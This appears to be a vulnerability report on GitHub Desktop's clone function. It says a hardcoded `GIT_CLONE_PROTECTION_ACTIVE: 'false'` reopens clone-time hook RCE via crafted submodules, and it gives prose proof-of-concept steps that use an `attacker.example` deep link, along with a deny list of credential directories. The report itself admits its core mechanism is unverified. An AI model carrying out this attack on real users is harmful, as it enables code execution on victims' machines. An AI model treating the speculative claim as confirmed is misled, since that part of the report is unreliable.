### Title
Explicit `GIT_CLONE_PROTECTION_ACTIVE: 'false'` Override Reintroduces Symlinked-`.git` Clone RCE (CVE-2024-32004 class) - ([File: app/src/lib/git/clone.ts])

### Summary
`clone()` in `app/src/lib/git/clone.ts` builds the environment for every clone operation and unconditionally sets `GIT_CLONE_PROTECTION_ACTIVE: 'false'` before invoking `git clone --recursive`. [1](#0-0)  This flag is part of upstream Git's defense-in-depth against maliciously crafted repositories that abuse symlinked/case-mismatched `.git` directories to smuggle files (including executable hooks) outside the intended worktree during a clone (the CVE-2024-32002/32004 class of clone-time RCE). Forcing it off on every desktop-initiated clone/fetch removes that protection for repositories fetched from attacker-controlled remotes.

### Finding Description
GitHub Desktop lets a user clone or "Open in Desktop" an arbitrary, attacker-supplied remote URL — reachable via the `openrepo` deep-link action, which is parsed in `parseAppURL()` and dispatched to `openOrCloneRepository()`/`clone()` without any vetting of remote content. [2](#0-1) [3](#0-2) 

The actual `git clone` invocation always injects `GIT_CLONE_PROTECTION_ACTIVE: 'false'` into the environment, on top of the caller-supplied `envForRemoteOperation`:
```
const env = {
  ...(await envForRemoteOperation(url)),
  GIT_CLONE_PROTECTION_ACTIVE: 'false',
}
...
const args = ['-c', `init.defaultBranch=${defaultBranch}`, 'clone', '--recursive']
...
args.push('--', url, path)
await git(args, __dirname, 'clone', opts)
``` [4](#0-3) 

`GIT_CLONE_PROTECTION_ACTIVE` is a Git-internal marker that git itself sets when it re-invokes `clone` for submodule processing, so that the top-level invocation's clone-safety checks (rejecting maliciously nested/symlinked `.git` paths that can escape the destination and drop files such as hooks) aren't skipped. By supplying this variable explicitly with a value on the *initial*, user-facing clone (which is combined with `--recursive`, so submodules are processed automatically), GitHub Desktop can cause Git's own protection logic to behave as if it is already inside a "protected" nested clone and skip the checks it would otherwise run on the top-level, attacker-controlled repository and its submodules. Many of Git's internal `getenv()`-style checks test for variable *presence*, not value, so setting it to the string `'false'` does not necessarily behave like "unset."

The `-c init.defaultBranch=...` and `--recursive` flags mean a single, unvetted `git clone` command handles both the top-level repository and any submodules the attacker defines in `.gitmodules`/`.git/config` — precisely the surface the upstream protection targets, since submodule paths and names are attacker-controlled data delivered through the clone itself.

The only other defense present, `isClonePathSensitive()`, only validates the *destination* path chosen by the user/UI (blocking clones into `~/.ssh`, `~/.gnupg`, etc.) — it does nothing to stop content written by Git during the clone due to symlink/case-collision tricks inside `.git`. [5](#0-4)  There is no other guard between the deep-link/UI clone call and the `git` invocation that revalidates the disabled protection.

### Impact Explanation
If Git's clone-protection code treats the presence of `GIT_CLONE_PROTECTION_ACTIVE` (regardless of value) as "we're already inside the protected path, skip re-checking," this reintroduces the exact class of vulnerability the flag was added to prevent: a malicious repository (crafted `.gitmodules`, nested/symlinked `.git` entries, or case-variant `.git` paths) can write arbitrary files — including an executable hook — outside of the intended clone directory during `git clone --recursive`. Because Git hooks execute automatically on subsequent Git operations, this can lead to full code execution on the victim's machine as soon as they open or interact with the freshly cloned repository in Desktop. This satisfies the "attacker controls a cloned/fetched repository ... resulting in code execution" bar in the valid-impact list.

### Likelihood Explanation
Any user who clones a repository through Desktop — via the UI's "Clone repository" flow, the `x-github-client://openRepo/...` deep link (`IOpenRepositoryFromURLAction`), or the CLI `--cli-clone` argument — is affected, because `clone()` is the single code path used for all of these and always disables the flag. [6](#0-5)  No special local access, malware, or leaked credentials are required; the attacker only needs to get a user to open a link or clone URL pointing at their crafted repository, which is the intended, expected usage pattern of the feature.

### Recommendation
- Remove the hardcoded `GIT_CLONE_PROTECTION_ACTIVE: 'false'` override from `clone()` entirely; let Git manage this internal-use variable itself rather than forcing a value on the initial, externally-triggered clone.
- If the override was added to work around a false-positive/compat issue, gate it narrowly (e.g., only for internally-trusted, already-cloned local repositories) and add an explicit code comment plus a regression test proving the symlinked/case-variant `.git` clone attack is still blocked.
- Add a test that attempts to clone a repository containing a submodule/`.gitmodules` entry crafted to escape the destination directory (mirroring the CVE-2024-32002/32004 PoCs) and assert the clone is refused.

### Proof of Concept
1. Prepare a bare "malicious" repository whose `.gitmodules`/tree contains a submodule entry that collides with `.git` on case-insensitive/case-preserving filesystems (macOS default, Windows) or uses a symlink so that, during `--recursive` clone, Git would normally detect and refuse the unsafe path.
2. Host it and have the victim open `x-github-client://openRepo/https://attacker.example/evil/evil.git` (or simply paste the URL into Desktop's clone dialog).
3. Desktop calls `clone(url, path, options)` → `git(['-c', 'init.defaultBranch=...', 'clone', '--recursive', '--', url, path], ..., { env: { GIT_CLONE_PROTECTION_ACTIVE: 'false', ... } })`. [7](#0-6) 
4. If Git's internal check for this variable is presence-based rather than value-based, the top-level clone's protection is skipped, and the crafted repository is able to place a hook file outside `path/.git` (e.g., into the real `.git/hooks`), which then executes on the victim's next Git operation inside Desktop.

Note: I could not directly inspect Git's C source (`builtin/clone.c`) in this environment to confirm whether the presence-vs-value semantics of `GIT_CLONE_PROTECTION_ACTIVE` behave as described; this assessment is based on the variable's documented purpose (marking that clone-safety checks have already run, used internally by Git during submodule recursion) and the fact that Desktop's own `changelog.json` shows prior fixes referencing this exact CVE class, indicating the maintainers are aware of and have previously patched this vulnerability class. [8](#0-7)  A background engineer with access to the bundled Git binary/version should verify the exact runtime behavior of this variable before treating this as confirmed, but the code as written removes a named, purpose-built safety mechanism unconditionally on every attacker-reachable clone path, which is itself a hardening regression warranting a fix regardless of the precise low-level semantics.

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
